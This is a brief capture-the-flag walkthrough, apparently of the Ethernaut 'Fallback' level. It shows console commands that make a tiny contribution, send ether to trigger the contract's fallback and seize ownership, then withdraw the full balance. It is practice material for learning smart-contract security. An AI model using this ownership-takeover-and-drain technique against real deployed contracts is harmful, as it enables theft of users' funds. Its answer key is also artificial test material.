# Fallback

Use of the fallback method.

```
> await contract.owner() == player
false

> await contract.contribute({ from: player, value: 1 })

> web3.utils.toWei(await contract.getContribution())
'1'

> await contract.sendTransaction({ from: player, value: 1 })

> await contract.owner() == player
true

> await contract.withdraw()

> web3.utils.toWei(await getBalance(contract.address))
'0'
```

Level completed.
